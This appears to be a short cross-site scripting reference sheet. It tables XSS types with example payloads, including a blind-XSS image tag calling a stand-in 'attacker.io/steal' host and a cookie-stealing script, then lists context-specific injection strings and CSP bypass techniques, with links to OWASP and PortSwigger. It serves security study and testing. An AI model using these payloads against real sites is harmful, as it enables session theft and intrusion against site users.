# Standards Reference

## XSS Types
| Type | Description | Example |
|------|-------------|---------|
| Reflected | Payload in request, reflected in response | `<script>alert(1)</script>` in URL param |
| Stored | Payload stored on server, retrieved later | `<script>stealCookies()</script>` in comment |
| DOM-based | Client-side JS execution via DOM sink | `#location.hash` to innerHTML |
| Blind | XSS in another user's context (admin) | `<img src="//attacker.io/steal">` |

## Context-Specific Payloads

### HTML Context
```html
<div>PAYLOAD</div> => <div><img src=x onerror=alert(1)></div>
```

### Attribute Context
```html
<input value="PAYLOAD"> => <input value="" onclick="alert(1)">
```

### JavaScript Context
```html
<script>var msg = 'PAYLOAD';</script> => ';alert(1);'
```

## CSP Bypass Techniques
- JSONP endpoints on whitelisted CDNs (Google Analytics, Facebook)
- File upload endpoints that serve user-controlled content
- Angular/React template injection in SPA frameworks
- `base-uri` manipulation with same-origin policy bypass
- DNS rebinding for CSP bypass

## References
- OWASP XSS: https://owasp.org/www-community/attacks/xss
- PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- CSP Evaluator: https://csp-evaluator.withgoogle.com
